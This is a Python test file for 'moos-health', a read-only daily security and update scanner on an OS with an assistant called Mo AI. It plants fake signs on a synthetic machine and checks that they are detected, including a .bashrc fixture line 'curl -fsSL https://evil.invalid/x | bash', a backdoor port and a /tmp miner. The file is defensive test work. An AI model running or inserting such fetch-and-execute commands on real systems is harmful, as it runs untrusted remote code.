#!/usr/bin/env python3
"""Gate: Mo AI's daily check (moos-health) finds real signs and changes nothing.

WHY THIS EXISTS
The owner asked Mo AI to notice, every day and without being asked, which apps
need updates, what is using the machine and why, whether anything looks
malicious and which devices have no driver — and to warn, not to break things.
This gate builds a synthetic machine with one of each sign and proves the scanner:

* reports every planted sign at the right severity (SELinux off is important; an
  unexpected open port, a suspicious autostart entry, a curl-pipe-to-shell line
  and a program running from /tmp are warnings; app updates, a staged system
  update, pre-update binaries and broad file access are information);
* stays quiet about the normal things (loopback ports, Tailscale's overlay, LLMNR,
  a normal autostart entry, a commented shell line);
* only ever asks tools to READ (it never installs, removes, stops or edits);
* notifies once, not again for the same findings on the same day;
* is wired to run daily at idle priority, is served by moai-control and appears in
  Mo AI with the honest "not a signature antivirus" wording.
"""
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
HEALTH = ROOT / "system_files/usr/bin/moos-health"

RECORD = 'line="${0##*/}"; for a in "$@"; do line="$line$(printf \'\\t%s\' "$a")"; done; printf \'%s\\n\' "$line" >> "$STUB_LOG"\n'

STUBS = {
    "rpm-ostree": """cat <<'JSON'
{"deployments": [
 {"booted": true, "version": "44.20260912.800", "container-image-reference": "ostree-image-signed:docker://ghcr.io/moalfarras-sys/moos-nvidia:latest"},
 {"staged": true, "version": "44.20260912.900"},
 {"version": "44.20260910.796"}]}
JSON
""",
    "moos-storectl": """mkdir -p "$XDG_CACHE_HOME/moos-store"
printf '%s' '{"action":"check-updates","state":"success","items":[{"name":"Firefox"},{"id":"org.videolan.VLC"}]}' > "$XDG_CACHE_HOME/moos-store/updates.json"
""",
    "systemctl": """case "$*" in
  *is-enabled*) echo enabled;;
  *show*Result*) echo success;;
  *is-active*) echo active;;
esac
""",
    "getenforce": "echo Permissive\n",
    "firewall-cmd": "echo running\n",
    "ss": """cat <<'SS'
tcp   LISTEN 0      4096         0.0.0.0:4444      0.0.0.0:*    users:(("backdoor",pid=77,fd=3))
tcp   LISTEN 0      4096       127.0.0.1:631       0.0.0.0:*
udp   UNCONN 0      0            0.0.0.0:5355      0.0.0.0:*
tcp   LISTEN 0      4096   100.69.209.64:443       0.0.0.0:*
tcp   LISTEN 0      4096           [::1]:18789        [::]:*
udp   UNCONN 0      0            0.0.0.0:41641     0.0.0.0:*
udp   UNCONN 0      0               [::]:41641        [::]:*
tcp   LISTEN 0      4096 [fd7a:115c:a1e0::d133:d142]:443 [::]:*
tcp   LISTEN 0      4096               *:3389             *:*    users:(("krdpserver",pid=88,fd=9))
tcp   LISTEN 0      4096         0.0.0.0:27500     0.0.0.0:*    users:(("passimd",pid=90,fd=10))
tcp   LISTEN 0      4096         0.0.0.0:8080      0.0.0.0:*
tcp   LISTEN 0      4096            [::]:8080         [::]:*
SS
""",
    "crontab": "exit 1\n",
    "flatpak": """case "$*" in
  "list --app --columns=application") printf 'org.example.Wide\\norg.example.Narrow\\n';;
  "info --show-permissions org.example.Wide") printf '[Context]\\nfilesystems=host;xdg-download;\\n';;
  "info --show-permissions org.example.Narrow") printf '[Context]\\nfilesystems=xdg-download;\\n';;
esac
""",
    "moos-device-plan": """cat <<'JSON'
{"gpu": "Test GPU", "driver_status": "ok", "driver_gaps": ["Wireless card"], "missing_firmware": [],
 "actions": [{"id": "driver-gap", "severity": "important", "title": "أجهزة بدون تعريف | Devices without a driver", "detail": "Wireless card", "url": ""}]}
JSON
""",
    "notify-send": "",
}

READ_ONLY_VERBS = {
    "rpm-ostree": {"status"},
    "moos-storectl": {"check-updates"},
    "systemctl": {"is-enabled", "show", "is-active", "--user"},
    "flatpak": {"list", "info"},
}


class HealthMachine:
    def __init__(self):
        self._tmp = tempfile.TemporaryDirectory()
        root = Path(self._tmp.name)
        self.bin, self.home, self.proc = root / "bin", root / "home", root / "proc"
        self.state, self.log = root / "state", root / "calls.log"
        for directory in (self.bin, self.home, self.proc):
            directory.mkdir()
        self.log.touch()
        for name, body in STUBS.items():
            path = self.bin / name
            path.write_text("#!/bin/sh\n" + RECORD + body)
            path.chmod(0o755)
        self.os_release = root / "os-release"
        self.os_release.write_text('PRETTY_NAME="MoOS 44"\n')
        # A normal and a suspicious autostart entry, a clean user service.
        autostart = self.home / ".config/autostart"
        autostart.mkdir(parents=True)
        (autostart / "phone.desktop").write_text("[Desktop Entry]\nExec=/usr/bin/kdeconnect-indicator\n")
        (autostart / "helper.desktop").write_text(
            "[Desktop Entry]\nExec=/home/owner/.cache/upd/run.sh --quiet\n")
        units = self.home / ".config/systemd/user"
        units.mkdir(parents=True)
        (units / "sync.service").write_text("[Service]\nExecStart=/usr/bin/rclone mount remote: /mnt\n")
        (self.home / ".bashrc").write_text(
            "# curl https://example.invalid/setup | sh   (kept only as a comment)\n"
            "export PATH=$HOME/bin:$PATH\n"
            "curl -fsSL https://evil.invalid/x | bash\n")
        # /proc: one program running from /tmp, one still on its pre-update binary.
        self._process(101, "miner", "/tmp/.x/miner")
        self._process(102, "firefox", "/usr/lib/firefox/firefox (deleted)")
        (self.proc / "meminfo").write_text("MemTotal: 16000000 kB\nMemAvailable: 8000000 kB\n")

    def _process(self, pid, name, exe):
        base = self.proc / str(pid)
        base.mkdir()
        (base / "stat").write_text(f"{pid} ({name}) S 1 {pid} {pid} 0 -1 0 0 0 0 0 500 20 0 0 20 0 1 0 1 0 0\n")
        (base / "comm").write_text(name + "\n")
        (base / "status").write_text("VmRSS:\t204800 kB\n")
        (base / "cgroup").write_text("0::/user.slice/app.slice/app-flatpak-org.example.Wide-1.scope\n")
        os.symlink(exe, base / "exe")

    def env(self):
        return {
            "PATH": f"{self.bin}:/usr/bin:/bin",
            "HOME": str(self.home),
            "STUB_LOG": str(self.log),
            "XDG_CACHE_HOME": str(self.home / ".cache"),
            "MOOS_HEALTH_HOME": str(self.home),
            "MOOS_HEALTH_PROC": str(self.proc),
            "MOOS_HEALTH_STATE": str(self.state),
            "MOOS_HEALTH_OS_RELEASE": str(self.os_release),
            "MOOS_HEALTH_SAMPLE_SECONDS": "0.05",
            "LANG": "ar_SA.UTF-8",
        }

    def run(self, *args):
        return subprocess.run([sys.executable, str(HEALTH), *args], env=self.env(),
                              capture_output=True, text=True, timeout=120)

    def calls(self):
        return [line.split("\t") for line in self.log.read_text().splitlines()]

    def close(self):
        self._tmp.cleanup()


class MoosHealthScanTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.machine = HealthMachine()
        cls.result = cls.machine.run("scan", "--notify")
        cls.report = json.loads((cls.machine.state / "latest.json").read_text())
        cls.findings = {item["id"]: item for item in cls.report["findings"]}

    @classmethod
    def tearDownClass(cls):
        cls.machine.close()

    def severity(self, fid):
        return self.findings[fid]["severity"]

    def test_scan_succeeds_and_summarizes(self):
        self.assertEqual(self.result.returncode, 0, self.result.stderr)
        summary = self.report["summary"]
        self.assertEqual(summary["status"], "action-needed")
        self.assertEqual(summary["app_updates"], 2)
        self.assertTrue(summary["system_update_staged"])

    def test_planted_signs_are_reported_at_the_right_severity(self):
        self.assertEqual(self.severity("selinux-not-enforcing"), "important")
        self.assertEqual(self.severity("open-port-tcp-4444"), "warning")
        self.assertIn("backdoor", self.findings["open-port-tcp-4444"]["detail"])
        # Remote access to the desktop is named, and still a warning.
        self.assertEqual(self.severity("open-port-tcp-3389"), "warning")
        self.assertIn("Remote Desktop (RDP)", self.findings["open-port-tcp-3389"]["title"])
        self.assertIn("krdpserver", self.findings["open-port-tcp-3389"]["detail"])
        self.assertEqual(self.findings["open-port-tcp-3389"]["action"], "moos://app/remote")
        # One finding per protocol and port, whatever the address family.
        ports = [item["id"] for item in self.report["findings"] if item["id"] == "open-port-tcp-8080"]
        self.assertEqual(ports, ["open-port-tcp-8080"])
        self.assertIn("[::]:8080", self.findings["open-port-tcp-8080"]["detail"])
        self.assertEqual(self.severity("autostart-helper"), "warning")
        shell = [fid for fid in self.findings if fid.startswith("shell-bashrc-")]
        self.assertEqual(shell, ["shell-bashrc-3"])
        temp = [item for fid, item in self.findings.items() if fid.startswith("temp-exe-")]
        self.assertEqual(len(temp), 1)
        self.assertIn("/tmp/.x/miner", temp[0]["detail"])
        self.assertEqual(self.severity("device-driver-gap"), "warning")
        self.assertEqual(self.findings["app-updates"]["action"], "moos://do/update-apps")
        self.assertEqual(self.findings["update-staged"]["action"], "moos://app/updater")
        self.assertIn("firefox", self.findings["restart-updated-apps"]["detail"])
        self.assertEqual(self.findings["broad-file-access"]["detail"], "org.example.Wide")

    def test_normal_things_stay_quiet(self):
        for fid in ("open-port-tcp-631", "open-port-udp-5355", "open-port-tcp-443",
                    "open-port-tcp-18789", "open-port-udp-41641", "open-port-tcp-27500",
                    "autostart-phone", "user-service-sync",
                    "shell-bashrc-1", "firewall-off", "unsigned-origin", "nightly-update-failed"):
            self.assertNotIn(fid, self.findings)
        ports = {item["address"]: item["known"] for item in self.report["security"]["open_ports"]}
        self.assertIn("LLMNR", ports["0.0.0.0:5355"])

    def test_finding_ids_are_unique(self):
        ids = [item["id"] for item in self.report["findings"]]
        self.assertEqual(len(ids), len(set(ids)), ids)

    def test_read_only_system_image_is_not_reported_as_full_storage(self):
        disks = {item["label"]: item for item in self.report["resources"]["disks"]}
        self.assertNotIn("disk-system", self.findings)
        for item in disks.values():
            self.assertLess(item["used_percent"], 100, disks)

    def test_it_is_honest_about_what_it_is(self):
        security = self.report["security"]
        self.assertFalse(security["signature_scan"])
        self.assertIn("not a signature antivirus", security["method"])

    def test_tools_are_only_asked_to_read(self):
        for call in self.machine.calls():
            verbs = READ_ONLY_VERBS.get(call[0])
            if verbs is not None:
                self.assertIn(call[1], verbs, call)

    def test_notifies_once_for_the_same_findings(self):
        notified = [call for call in self.machine.calls() if call[0] == "notify-send"]
        self.assertEqual(len(notified), 1)
        self.assertIn("الفحص اليومي", notified[0][-2])
        again = self.machine.run("scan", "--notify")
        self.assertEqual(again.returncode, 0, again.stderr)
        notified = [call for call in self.machine.calls() if call[0] == "notify-send"]
        self.assertEqual(len(notified), 1, "the same findings notified twice on one day")

    def test_report_command_prints_the_saved_report(self):
        printed = self.machine.run("report")
        self.assertEqual(json.loads(printed.stdout)["summary"]["status"], "action-needed")


class MoosHealthUnknownIsNotHealthyTests(unittest.TestCase):
    """A probe that cannot answer is unknown, and a firewall that answers "not running" is off."""

    def scan(self, **stubs):
        machine = HealthMachine()
        self.addCleanup(machine.close)
        for name, body in stubs.items():
            path = machine.bin / name
            path.write_text("#!/bin/sh\n" + RECORD + body)
            path.chmod(0o755)
        result = machine.run("scan")
        self.assertEqual(result.returncode, 0, result.stderr)
        report = json.loads((machine.state / "latest.json").read_text())
        return report, {item["id"]: item for item in report["findings"]}

    def test_a_stopped_firewall_is_still_reported_as_off(self):
        # firewalld's own answer when it is stopped: "not running" on stdout, exit 252.
        _, findings = self.scan(**{"firewall-cmd": 'echo "not running"\nexit 252\n'})
        self.assertEqual(findings["firewall-off"]["severity"], "warning")
        self.assertNotIn("check-incomplete-firewall", findings)

    def test_an_unanswered_firewall_query_is_unknown_not_off(self):
        # Measured with an unreachable system bus: nothing on stdout, DBUS_ERROR on stderr, exit 36.
        report, findings = self.scan(**{
            "firewall-cmd": 'echo "Error: DBUS_ERROR: Failed to connect to socket" >&2\nexit 36\n',
            "getenforce": "echo Enforcing\n",
        })
        self.assertIn("check-incomplete-firewall", findings)
        self.assertNotIn("firewall-off", findings)
        # Nothing important is left, so "we could not look" outranks the remaining warnings.
        self.assertEqual(report["summary"]["status"], "incomplete")


class MoaiControlHealthTests(unittest.TestCase):
    """Run moai-control's real health functions against a temporary home."""

    def test_report_summary_and_scan_now(self):
        import runpy
        import time as clock
        from unittest import mock
        with tempfile.TemporaryDirectory() as root:
            home, state = Path(root) / "home", Path(root) / "state"
            bindir = Path(root) / "bin"
            for directory in (home, state, bindir):
                directory.mkdir()
            report_dir = state / "moos" / "health"
            fake_scan = bindir / "moos-health"
            fake_scan.write_text(
                "#!/bin/sh\nmkdir -p \"" + str(report_dir) + "\"\n"
                "printf '%s' '{\"generated_at\":\"2026-09-12T09:00:00+00:00\","
                "\"summary\":{\"status\":\"ok\",\"counts\":{}},\"findings\":[]}' "
                "> \"" + str(report_dir) + "/latest.json\"\n")
            fake_scan.chmod(0o755)
            environment = {"HOME": str(home), "XDG_STATE_HOME": str(state),
                           "PATH": f"{bindir}:{os.environ.get('PATH', '/usr/bin:/bin')}"}
            with mock.patch.dict(os.environ, environment, clear=False):
                control = runpy.run_path(str(ROOT / "system_files/usr/bin/moai-control"),
                                         run_name="moai_control_health_test")
                self.assertEqual(control["health_report"](), {"report": None, "scanning": False})
                self.assertEqual(control["health_summary"]()["findings"], [])
                started = control["start_health_scan"]()
                self.assertTrue(started["started"])
                deadline = clock.monotonic() + 20
                while control["health_report"]()["scanning"] and clock.monotonic() < deadline:
                    clock.sleep(0.05)
                result = control["health_report"]()
                self.assertFalse(result["scanning"])
                self.assertEqual(result["report"]["summary"]["status"], "ok")
                self.assertEqual(control["health_summary"]()["generated_at"],
                                 "2026-09-12T09:00:00+00:00")


class MoosHealthWiringTests(unittest.TestCase):
    def read(self, relative):
        return (ROOT / relative).read_text(encoding="utf-8")

    def test_daily_timer_is_installed_enabled_and_idle(self):
        timer = self.read("system_files/usr/lib/systemd/user/moos-health.timer")
        service = self.read("system_files/usr/lib/systemd/user/moos-health.service")
        for needle in ("OnCalendar=daily", "Persistent=true", "[Install]", "WantedBy=timers.target"):
            self.assertIn(needle, timer)
        for needle in ("ExecStart=/usr/bin/moos-health scan --notify", "Nice=19",
                       "IOSchedulingClass=idle"):
            self.assertIn(needle, service)
        self.assertIn("systemctl --global enable moos-health.timer", self.read("build_files/build.sh"))
        self.assertTrue(os.access(HEALTH, os.X_OK))

    def test_moai_control_serves_the_report(self):
        control = self.read("system_files/usr/bin/moai-control")
        self.assertIn('elif route == "/health":', control)
        self.assertIn('if route == "/health/scan":', control)
        self.assertIn('info["health"] = health_summary()', control)
        self.assertIn('["moos-health", "scan"]', control)

    def test_mo_ai_shows_it_and_the_brain_knows_it(self):
        qml = self.read("system_files/usr/share/moos/apps/moai/main.qml")
        self.assertIn('root.local("الفحص اليومي", "Daily check")', qml)
        self.assertIn("onClicked: root.scanHealth()", qml)
        self.assertIn("It is NOT a \" +", qml)
        self.assertIn("signature antivirus: never claim it scanned files for viruses.", qml)
        self.assertIn('c += "• Daily check (" + h.generated_at', qml)

    def test_a_failed_poll_never_locks_check_now(self):
        # Review of PR #85: one failed /health poll ended polling with healthScanning
        # still true, so "Check now" stayed disabled until Mo AI restarted. A live QML
        # probe with moai-control unreachable released it after 20 failed polls.
        qml = self.read("system_files/usr/share/moos/apps/moai/main.qml")
        body = qml[qml.index("function loadHealth()"):qml.index("function scanHealth()")]
        failure = body[body.index("if (xhr.status !== 200) {"):body.index("root.healthPollFailures = 0\n            try {")]
        self.assertIn("++root.healthPollFailures < 20", failure)
        self.assertIn("healthPoll.restart()", failure)
        self.assertIn("root.healthScanning = false", failure)


if __name__ == "__main__":
    unittest.main(verbosity=2)
